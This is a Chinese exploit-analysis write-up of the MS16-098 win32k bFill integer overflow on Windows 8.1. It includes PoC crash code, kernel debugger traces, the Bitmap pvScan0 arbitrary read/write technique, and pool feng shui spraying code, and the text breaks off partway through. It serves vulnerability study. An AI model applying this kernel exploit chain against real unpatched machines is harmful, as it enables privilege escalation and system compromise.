### 前言
通过对比MS16-098补丁可以在win32k的bFill函数中发现这个整数溢出问题，而它将引发一个池溢出。本文的利用思路主要参考[该文](https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/ "该文")，这里给出一些调试和逆向分析的过程，并讨论利用过程中的一些思路和细节问题。  
测试环境 windows 8.1
### 漏洞成因
以下基本块展示了整数溢出的触发点  
指令`lea ecx,
[rax+rax*2]`将rax乘3后放入ecx中，而rax是受ring3层控制的，所以我们可以将rax设置到足够大，使得rax乘3的结果的低32位截断到ecx。如rax为0x55555557时，ecx为0x5，这使得之后的PALLOCMEM2分配空间时只分配(0x5
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char* argv[])
    {
        static POINT points[0x3fe01];
        points[0].x = 0x22;
        points[0].y = 0x33;
        HDC hdc = GetDC(NULL);
        HDC hMemDC = CreateCompatibleDC(hdc);
        HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
        HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
        BeginPath(hMemDC);
        for (int j = 0; j  kb
    00 fffff800`84be60ba : 00000000`00000000 00000000`00000000 ffffd001`893163a0 fffff800`84a2b06c : nt!DbgBreakPointWithStatus
    01 fffff800`84be59cb : 00000000`00000003 00000000`00000020 fffff800`84b5f980 00000000`00000019 : nt!KiBugCheckDebugBreak+0x12
    02 fffff800`84b51aa4 : fffff901`401ef2e0 00000000`00000000 00000000`00000000 00000001`00000000 : nt!KeBugCheck2+0x8ab
    03 fffff800`84ca605e : 00000000`00000019 00000000`00000020 fffff901`401ef2e0 fffff901`401ef340 : nt!KeBugCheckEx+0x104
    04 fffff960`00245e7e : ffffd001`89317360 fffff901`401ef2f0 00000000`00000001 00000000`00000006 : nt!ExDeferredFreePool+0x7ee
    05 fffff960`002137e1 : fffff900`00002000 00000000`00000080 00000000`00000001 ffffd001`849a4c10 : win32k!bFill+0x63e
说明正是在以下位置free pool时引起的crash
接着在几个比较关键的地方下断点，首先是整数溢出的位置
    kd> r
    rax=0000000005555557 rbx=ffffd001826bf970 rcx=0000000000000050
    rdx=0000000067646547 rsi=ffffd001826bf970 rdi=ffffd001826bf834
    rip=fffff96000245bc7 rsp=ffffd001826beae0 rbp=ffffd001826bf250
     r8=0000000000000000  r9=fffff960002169a4 r10=ffffd001826bf970
    r11=fffff90144c45018 r12=ffffd001826bf360 r13=ffffd001826bf360
    r14=ffffd001826bf970 r15=fffff960002169a4
    iopl=0         nv up ei pl zr na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
    win32k!bFill+0x387:
    fffff960`00245bc7 e8d462e6ff      call    win32k!PALLOCMEM2 (fffff960`000abea0)
可以看到分配的大小rcx为0x50，步过后我们记录下返回的缓冲区地址。接着执行到bConstructGET处，查看内存的覆盖情况，如下:
接着执行最后就会free pool了，这就是poc引起crash整个的流程。
### 利用思路
整数溢出类似off by one，仅通过该漏洞很难完成利用，通常需要搭配其他漏洞或根据程序流将自身转换为其他漏洞类型。
#### 基本思路
这里的整数溢出最终转换为了一个缓冲区溢出，如何从缓冲区溢出到执行shellcode呢，可以考虑一种使用Bitmap对象来进行任意地址写的方法。当调用CreateBitmap时，会创建0x10大小的堆头，0x18大小的BaseObject
header，之后是surfobj header，最后才是数据部分。其中surfobj header结构如下
    typedef struct {
      ULONG64 dhsurf; // 0x00
      ULONG64 hsurf; // 0x08
      ULONG64 dhpdev; // 0x10
      ULONG64 hdev; // 0x18
      SIZEL sizlBitmap; // 0x20
      ULONG64 cjBits; // 0x28
      ULONG64 pvBits; // 0x30
      ULONG64 pvScan0; // 0x38
      ULONG32 lDelta; // 0x40
      ULONG32 iUniq; // 0x44
      ULONG32 iBitmapFormat; // 0x48
      USHORT iType; // 0x4C
      USHORT fjBitmap; // 0x4E
    } SURFOBJ64; // sizeof = 0x50
要通过Bitmap对象完成任意地址写，需要关注的字段有sizlBitmap和pvScan0，前者表示Bitmap的长宽，用于指示可访问大小，而后者则是指向当前数据的指针，通过GetBitmapBits和SetBitmapBits能够对该位置进行读写。要使我们的读写能力达到最大化，考虑存在两个Bitmap对象，Bitmap0和Bitmap1的情景，Bitmap0的pvScan0指向Bitmap1的pvScan0，这使得Bitmap1的pvScan0可控，于是在随后任何需要的时候，都能够重新设置要读写的地址。  
不过在本例中，由于溢出数据不可控，所以不能将pvScan0精确指向Bitmap1的pvScan0处，但却可以增大sizlBitmap的大小来变相达到目的。因此可以构造这样一个场景，通过缓冲区溢出，使Bitmap0的sizlBitmap变大，扩大Bitmap0的读写范围，这意味着可以通过SetBitmapBits从Bitmap0数据开始处溢出到Bitmap1的SURFOBJ结构，且溢出数据可控，以此达到完全任意地址读写的能力。为此，我们需要构造符合这种情景的内存布局
    | pmalloc 0x50 | Bitmap0 | Bitmap1 |
#### pool feng shui
在进行布局前，先介绍介绍pool的相关背景知识。kernel pool是内核的堆管理方式，可分为3类：
  * Desktop Heap。使用RtlAllocateHeap或DesktopAlloc分配，RtlFreeHeap释放
  * Non-Paged Pool。通常是系统对象，如信号量，事件对象等，它们的虚拟地址直接可以映射到物理地址
  * Paged Session Pool。使用ExAllocatePoolWithTag分配，ExFreePoolWithTag释放
在本例中的分配均属于Paged Session
Pool，因为PAllOCMEM2最终会调用ExAllocatePoolWithTag，要通过它来进行溢出并完成利用，必须使其他的对象处于相同的堆管理系统。在Paged
Session
Pool中，内存池被划分为以0x1000字节为单位的页，每次申请一块内存时，会先分配0x1000的页，再从页中分配所需大小的块，在64位系统中，每个块有0x10字节的头部。当分配大小大于0x808时，从前面开始分配，反之则从后往前分配。  
现在来重新考察我们所希望的内存布局，并解决一些细节问题。要说明的是，这里展现的形式只代表了这些对象在内存中地址的高低关系，并非表明它们是相邻的。
    | PALLOCMEM 0x50 | Bitmap0 | Bitmap1 |
第一个问题是，覆盖相邻块导致crash的问题。当释放一个页中的块时，系统会检测相邻块的头部是否合法，一旦覆盖了相邻块的头部，就会导致crash。解决的方法是，将PALLOCMEM分配的对象放置到一个页的尾部，因为系统只检测本页的相邻块，而下一页的块头部是不检测的。  
第二个问题是，PALLOCMEM的调用时机是在bFill函数中，且分配在页的尾部，如何将其放置到Bitmap0和Bitmap1之前。显然可以在bFill函数执行之前，提前在页的尾部制造一个空洞，并将Bitmap分配到一个页的前面，以此为基础进行heap
spray。  
最终导致一个页看起来像这样
    | padding | Bitmap | hole |
而内存布局就成了
    | region | Bitmap  | PALLOCMEM |
    | region | Bitmap0 |   region  |
    | region | Bitmap1 |   region  |
##### 调试验证
预先进行堆布局的代码如下
    void fengshui() 
    {
        HBITMAP bmp;
        for (int k = 0; k < 5000; k++) 
        {
            bmp = CreateBitmap(1670, 2, 1, 8, NULL);
            INT64 bmpAddr = getBitMapAddr(bmp);
            bitmaps[k] = bmp;
        }
        HACCEL hAccel, hAccel2;
        LPACCEL lpAccel;
        lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
        SecureZeroMemory(lpAccel, sizeof(ACCEL));
        HACCEL* pAccels = (HACCEL*)malloc(sizeof(HACCEL) * 7000);